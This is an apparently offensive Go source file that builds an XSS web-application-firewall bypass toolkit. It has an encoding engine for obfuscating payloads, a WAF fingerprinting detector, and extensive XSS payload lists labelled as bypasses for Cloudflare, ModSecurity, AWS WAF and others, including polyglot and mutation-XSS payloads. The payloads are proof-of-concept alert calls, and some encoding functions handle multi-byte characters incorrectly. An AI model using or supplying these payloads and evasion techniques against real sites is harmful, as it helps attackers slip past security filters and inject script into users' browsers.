package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"

	"github.com/fatih/color"
)

// محرك التشفير والتجاوز
type EncodingEngine struct {
	techniques []EncodingTechnique
}

// تقنية تشفير
type EncodingTechnique struct {
	Name        string
	Description string
	Function    func(string) string
}

// كاشف WAF
type WAFDetector struct {
	signatures map[string][]string
}

// إنشاء محرك تشفير جديد
func NewEncodingEngine() *EncodingEngine {
	return &EncodingEngine{
		techniques: []EncodingTechnique{
			{"URL Encoding", "Standard URL encoding", URLEncode},
			{"Double URL Encoding", "Double URL encoding for bypass", DoubleURLEncode},
			{"HTML Entity Encoding", "HTML entity encoding", HTMLEntityEncode},
			{"Unicode Encoding", "Unicode escape sequences", UnicodeEncode},
			{"Base64 Encoding", "Base64 with eval", Base64Encode},
			{"CharCode Encoding", "String.fromCharCode method", CharCodeEncode},
			{"Hex Encoding", "Hexadecimal encoding", HexEncode},
			{"Octal Encoding", "Octal escape sequences", OctalEncode},
			{"Mixed Case", "Case variation bypass", MixedCaseEncode},
			{"UTF-7 Encoding", "UTF-7 character encoding", UTF7Encode},
			{"Zero Width", "Zero-width characters", ZeroWidthEncode},
		},
	}
}

// إنشاء كاشف WAF جديد
func NewWAFDetector() *WAFDetector {
	signatures := map[string][]string{
		"Cloudflare": {
			"cloudflare",
			"cf-ray",
			"__cfduid",
			"cloudflare-nginx",
			"403 Forbidden",
			"Attention Required! | Cloudflare",
		},
		"ModSecurity": {
			"mod_security",
			"modsecurity",
			"blocked by mod_security",
			"Not Acceptable!",
			"406 Not Acceptable",
		},
		"AWS WAF": {
			"aws",
			"x-amzn-RequestId",
			"CloudFront",
			"Request blocked",
		},
		"Azure WAF": {
			"azure",
			"x-azure-ref",
			"Microsoft-Azure-Application-Gateway",
		},
		"Incapsula": {
			"incap_ses",
			"visid_incap",
			"incapsula",
			"X-Iinfo",
		},
		"Sucuri": {
			"sucuri",
			"x-sucuri-id",
			"cloudproxy",
		},
		"Barracuda": {
			"barracuda",
			"barra",
			"You have been blocked",
		},
		"F5 Big-IP": {
			"f5",
			"bigip",
			"BigIP",
			"F5",
			"x-wa-info",
		},
		"Fortinet": {
			"fortigate",
			"fortinet",
			"FORTIGATE",
		},
		"Akamai": {
			"akamai",
			"akamai-ghost",
			"AkamaiGHost",
		},
		"Imperva": {
			"imperva",
			"incapsula",
			"x-iinfo",
		},
	}

	return &WAFDetector{signatures: signatures}
}

// ==================== تقنيات التشفير ====================

// URL Encoding
func URLEncode(payload string) string {
	replacements := map[string]string{
		"<":  "%3C",
		">":  "%3E",
		"\"": "%22",
		"'":  "%27",
		" ":  "%20",
		"&":  "%26",
		"=":  "%3D",
		"/":  "%2F",
		"?":  "%3F",
		"#":  "%23",
		"+":  "%2B",
		"%":  "%25",
	}

	result := payload
	for original, encoded := range replacements {
		result = strings.ReplaceAll(result, original, encoded)
	}
	return result
}

// Double URL Encoding
func DoubleURLEncode(payload string) string {
	firstEncoding := URLEncode(payload)
	return URLEncode(firstEncoding)
}

// HTML Entity Encoding
func HTMLEntityEncode(payload string) string {
	replacements := map[string]string{
		"<":  "&lt;",
		">":  "&gt;",
		"\"": "&quot;",
		"'":  "&#x27;",
		"&":  "&amp;",
		"/":  "&#x2F;",
		"=":  "&#x3D;",
	}

	result := payload
	for original, entity := range replacements {
		result = strings.ReplaceAll(result, original, entity)
	}
	return result
}

// HTML Entity Encoding (Decimal)
func HTMLEntityDecimalEncode(payload string) string {
	var result strings.Builder
	for _, r := range payload {
		result.WriteString(fmt.Sprintf("&#%d;", r))
	}
	return result.String()
}

// Unicode Encoding
func UnicodeEncode(payload string) string {
	var result strings.Builder
	for _, r := range payload {
		result.WriteString(fmt.Sprintf("\\u%04x", r))
	}
	return result.String()
}

// Base64 Encoding with eval
func Base64Encode(payload string) string {
	encoded := base64.StdEncoding.EncodeToString([]byte(payload))
	return fmt.Sprintf("eval(atob('%s'))", encoded)
}

// String.fromCharCode Encoding
func CharCodeEncode(payload string) string {
	var codes []string
	for _, r := range payload {
		codes = append(codes, strconv.Itoa(int(r)))
	}
	return fmt.Sprintf("String.fromCharCode(%s)", strings.Join(codes, ","))
}

// Hex Encoding
func HexEncode(payload string) string {
	var result strings.Builder
	for _, r := range payload {
		result.WriteString(fmt.Sprintf("\\x%02x", r))
	}
	return result.String()
}

// Octal Encoding
func OctalEncode(payload string) string {
	var result strings.Builder
	for _, r := range payload {
		result.WriteString(fmt.Sprintf("\\%03o", r))
	}
	return result.String()
}

// Mixed Case Encoding
func MixedCaseEncode(payload string) string {
	var result strings.Builder
	for i, r := range payload {
		if i%2 == 0 {
			result.WriteRune(strings.ToUpper(string(r))[0])
		} else {
			result.WriteRune(strings.ToLower(string(r))[0])
		}
	}
	return result.String()
}

// UTF-7 Encoding
func UTF7Encode(payload string) string {
	// UTF-7 encoding للأحرف الخاصة
	replacements := map[string]string{
		"<":      "+ADw-",
		">":      "+AD4-",
		"script": "+AHM-cript",
		"alert":  "+AGE-lert",
		"'":      "+ACc-",
		"\"":     "+ACIAIg-",
	}

	result := payload
	for original, utf7 := range replacements {
		result = strings.ReplaceAll(result, original, utf7)
	}
	return result
}

// Zero Width Characters
func ZeroWidthEncode(payload string) string {
	// إضافة أحرف بعرض صفر
	zeroWidth := "\u200b\u200c\u200d\ufeff"
	var result strings.Builder
	
	for i, r := range payload {
		result.WriteRune(r)
		if i < len(payload)-1 {
			result.WriteString(string(zeroWidth[i%len(zeroWidth)]))
		}
	}
	return result.String()
}

// ==================== WAF Detection ====================

// كشف نوع WAF
func (w *WAFDetector) DetectWAF(resp *http.Response) string {
	// فحص Headers
	headers := w.extractHeaders(resp)
	
	// فحص Body (أول 1KB)
	body := make([]byte, 1024)
	if resp.Body != nil {
		resp.Body.Read(body)
		resp.Body.Close()
	}
	bodyText := strings.ToLower(string(body))

	// فحص كل نوع WAF
	for wafName, signatures := range w.signatures {
		for _, signature := range signatures {
			signature = strings.ToLower(signature)
			
			// فحص في Headers
			if strings.Contains(headers, signature) {
				return wafName
			}
			
			// فحص في Body
			if strings.Contains(bodyText, signature) {
				return wafName
			}
		}
	}

	return "Unknown"
}

// استخراج Headers كنص واحد
func (w *WAFDetector) extractHeaders(resp *http.Response) string {
	var headers strings.Builder
	for key, values := range resp.Header {
		headers.WriteString(strings.ToLower(key) + ": ")
		headers.WriteString(strings.ToLower(strings.Join(values, " ")))
		headers.WriteString("\n")
	}
	return headers.String()
}

// ==================== WAF Bypass Payloads ====================

// الحصول على payloads أساسية
func GetBasicXSSPayloads() []string {
	return []string{
		// Basic Payloads
		"<script>alert('XSS')</script>",
		"<img src=x onerror=alert('XSS')>",
		"<svg onload=alert('XSS')>",
		"<iframe src=javascript:alert('XSS')>",
		"<body onload=alert('XSS')>",
		"<input onfocus=alert('XSS') autofocus>",
		"<select onfocus=alert('XSS') autofocus>",
		"<textarea onfocus=alert('XSS') autofocus>",
		"<keygen onfocus=alert('XSS') autofocus>",
		"<video><source onerror=alert('XSS')>",
		"<audio src=x onerror=alert('XSS')>",
		"<details ontoggle=alert('XSS')>",
		"<marquee onstart=alert('XSS')>",
		"javascript:alert('XSS')",
		"data:text/html,<script>alert('XSS')</script>",
		
		// Event Handlers
		"<div onmouseover=alert('XSS')>test</div>",
		"<div onclick=alert('XSS')>test</div>",
		"<div onmouseout=alert('XSS')>test</div>",
		"<div onkeydown=alert('XSS')>test</div>",
		"<div onkeyup=alert('XSS')>test</div>",
		
		// Different quote styles
		`<script>alert("XSS")</script>`,
		`<script>alert('XSS')</script>`,
		`<script>alert(\`XSS\`)</script>`,
		`<img src="x" onerror="alert('XSS')">`,
		`<img src='x' onerror='alert("XSS")'>`,
	}
}

// الحصول على payloads متقدمة
func GetAdvancedXSSPayloads() []string {
	return []string{
		// Filter Bypass
		"<ScRiPt>alert('XSS')</ScRiPt>",
		"<SCRIPT>alert('XSS')</SCRIPT>",
		"<script type='text/javascript'>alert('XSS')</script>",
		"<script language='javascript'>alert('XSS')</script>",
		
		// Alternative tags
		"<embed src=javascript:alert('XSS')>",
		"<object data=javascript:alert('XSS')>",
		"<applet code=javascript:alert('XSS')>",
		"<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
		"<base href=javascript:alert('XSS')//>",
		
		// CSS-based
		"<style>@import'javascript:alert(\"XSS\")';</style>",
		"<link rel=stylesheet href=javascript:alert('XSS')>",
		"<style>body{background:url('javascript:alert(\"XSS\")')}</style>",
		
		// Encoded
		"<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
		"<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
		
		// Unicode
		"<img src=x onerror=\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0039\\u0039\\u0029>",
		
		// Hex
		"<img src=x onerror=\\x61\\x6C\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29>",
	}
}

// الحصول على payloads لتجاوز WAF
func GetWAFBypassPayloads() []string {
	return []string{
		// Cloudflare Bypass
		"<Img/Src/OnError=(alert)(1)>",
		"<svg onload=alert(1)>",
		"<iframe src=jaVasCript:alert(1)>",
		"<img src=\"x`<script>alert(1)</script>",
		"<svg><script>alert&#40;1&#41</script>",
		"<iframe src=\"data:text/html,<script>alert(1)</script>\">",
		"<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
		
		// ModSecurity Bypass
		"<script>/**/alert(1)</script>",
		"<script>/*!*/alert(1)</script>",
		"<script>/***/alert(1)</script>",
		"<script>al\\ert(1)</script>",
		"<script>a\\u006cert(1)</script>",
		"<script>eval('al'+'ert(1)')</script>",
		
		// AWS WAF Bypass
		"<script>alert(String.fromCharCode(88,83,83))</script>",
		"<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
		"<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
		
		// Generic WAF Bypass
		"<script>window['ale'+'rt'](1)</script>",
		"<script>window['al\\x65rt'](1)</script>",
		"<script>(alert)(1)</script>",
		"<script>[alert][0](1)</script>",
		"<script>alert.call(null,1)</script>",
		"<script>alert.apply(null,[1])</script>",
		"<script>setTimeout('alert(1)',0)</script>",
		"<script>setInterval('alert(1)',1000)</script>",
		
		// Comment-based bypass
		"<script>al/**/ert(1)</script>",
		"<script>al/*test*/ert(1)</script>",
		"<script>/**/alert(1)/**/</script>",
		
		// Case variation
		"<ScRiPt>AlErT(1)</ScRiPt>",
		"<SCRIPT>ALERT(1)</SCRIPT>",
		"<Script>Alert(1)</Script>",
		
		// Alternative syntax
		"<img src=# onerror=alert(1)>",
		"<img src=/ onerror=alert(1)>",
		"<img src=\\ onerror=alert(1)>",
		"<img src=? onerror=alert(1)>",
		
		// Polyglot Payloads
		"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
		"<img src=\"#\" onerror=\"alert(1)\" />",
		"'\"--></style></script><svg onload=alert(1)>",
		
		// Mutation XSS
		"<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
		"<listing><img src=x onerror=alert(1)></listing>",
		"<style><img src=x onerror=alert(1)></style>",
	}
}

// إنشاء payloads مخصصة لـ WAF محدد
func GenerateWAFSpecificPayloads(wafType string) []string {
	switch strings.ToLower(wafType) {
	case "cloudflare":
		return []string{
			"<Img/Src/OnError=(alert)(1)>",
			"<svg onload=alert(1)>",
			"<iframe src=\"j&#97;v&#97;script:alert(1)\">",
			"<img src=\"x`<script>alert(1)</script>",
			"<svg><script>alert&#40;1&#41</script>",
		}
	case "modsecurity":
		return []string{
			"<script>/**/alert(1)</script>",
			"<script>/*!*/alert(1)</script>",
			"<script>al\\ert(1)</script>",
			"<script>eval('al'+'ert(1)')</script>",
			"<img src=x onerror=\"al\\u0065rt(1)\">",
		}
	case "aws waf":
		return []string{
			"<script>alert(String.fromCharCode(88,83,83))</script>",
			"<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
			"<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
		}
	default:
		return GetWAFBypassPayloads()
	}
}

// تطبيق جميع تقنيات التشفير على payload
func (e *EncodingEngine) EncodeWithAllTechniques(payload string) map[string]string {
	results := make(map[string]string)
	
	for _, technique := range e.techniques {
		encoded := technique.Function(payload)
		results[technique.Name] = encoded
	}
	
	return results
}

// عرض تقنيات التشفير المتاحة
func (e *EncodingEngine) ListTechniques() {
	color.HiCyan("🔧 Available Encoding Techniques:")
	color.White("═══════════════════════════════════════")
	
	for i, technique := range e.techniques {
		color.Yellow("%d. %s", i+1, technique.Name)
		color.White("   %s", technique.Description)
	}
}

// اختبار تقنية تشفير
func (e *EncodingEngine) TestTechnique(payload, techniqueName string) string {
	for _, technique := range e.techniques {
		if technique.Name == techniqueName {
			return technique.Function(payload)
		}
	}
	return payload
}